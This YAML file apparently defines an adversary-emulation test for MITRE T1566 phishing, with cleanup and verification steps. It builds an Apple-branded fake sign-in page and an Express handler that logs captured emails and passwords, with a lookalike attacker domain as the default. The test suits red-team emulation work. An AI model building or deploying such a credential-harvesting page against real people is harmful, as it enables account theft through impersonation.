---
api_version: 2.0
uuid: 9d4e2f6a-3c1b-4d7e-8a5c-2f9b1e3d6c7a
name: Fake Login Page Creation
authors:
  - mbhatt
description: |
  Demonstrates fake login page creation by generating a convincing replica of
  legitimate authentication portals. Includes branding elements, SSL indicators,
  and credential capture mechanisms.

mitre:
  tactics:
    - "TA0001 Initial Access"
  techniques:
    - "T1566 Phishing"
  subtechniques:
    - "T1566.003 Phishing: Spearphishing via Service"

requirements:
  platforms:
    - os: darwin

args:
  - name: target_company
    description: "Company being impersonated"
    type: string
    default: "Apple"
  - name: fake_domain
    description: "Attacker-controlled domain"
    type: string
    default: "secure-apple-id-verify.com"
  - name: logo_url
    description: "URL to company logo"
    type: string
    default: "https://www.apple.com/ac/structured-data/images/open_graph_logo.160.png"

steps:
  - name: create_fake_login_page_html
    description: Create fake login page HTML with branding
    inline: |
      mkdir -p /tmp/fake_login_pages
      cat > /tmp/fake_login_pages/apple_id.html << 'HTMLEOF'
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <title>{{ target_company }} ID Sign In</title>
      </head>
      <body>
        <div class="container">
          <div class="logo"><img src="{{ logo_url }}" alt="{{ target_company }}"></div>
          <h1>Sign In to Your Account</h1>
          <form id="loginForm" action="/auth/verify" method="POST">
            <label for="email">Apple ID</label>
            <input type="email" id="email" name="email" placeholder="you@example.com" required>
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
          </form>
        </div>
      </body>
      </html>
      HTMLEOF
      echo "Created fake login page"
    cleanup:
      inline: |
        rm -rf /tmp/fake_login_pages

  - name: create_backend_credential_handler
    description: Create backend credential handler
    inline: |
      cat > /tmp/fake_login_pages/auth_handler.js << 'JSEOF'
      const express = require('express');
      const app = express();
      app.use(express.urlencoded({ extended: true }));
      app.post('/auth/verify', (req, res) => {
        const { email, password } = req.body;
        console.log('Credentials captured:', { email, password });
        res.send('Verifying your credentials...');
      });
      app.listen(8080, () => console.log('Server running on port 8080'));
      JSEOF
      echo "Created authentication handler"

  - name: log_page_creation
    description: Log page creation details
    inline: |
      mkdir -p /tmp/login_page_logs
      timestamp=$(date +%Y%m%d_%H%M%S)
      cat > /tmp/login_page_logs/creation_${timestamp}.log << 'LOGEOF'
      Fake Login Page Created
      Target Company: {{ target_company }}
      Fake Domain: {{ fake_domain }}
      Page Type: Authentication Portal
      LOGEOF
    cleanup:
      inline: |
        rm -rf /tmp/login_page_logs

  - name: verify_login_page_html_created
    description: Verify login page HTML was created
    inline: |
      test -f /tmp/fake_login_pages/apple_id.html && echo "PASS: Login page HTML created"

  - name: verify_page_contains_form
    description: Verify page contains a form element
    inline: |
      grep -q "<form" /tmp/fake_login_pages/apple_id.html && echo "PASS: Login form present"

  - name: verify_branding_elements_present
    description: Verify branding elements are present
    inline: |
      grep -q "{{ target_company }}" /tmp/fake_login_pages/apple_id.html && echo "PASS: Company branding present"

tests:
  - name: fake_login_page_creation_test
    dry_run: true
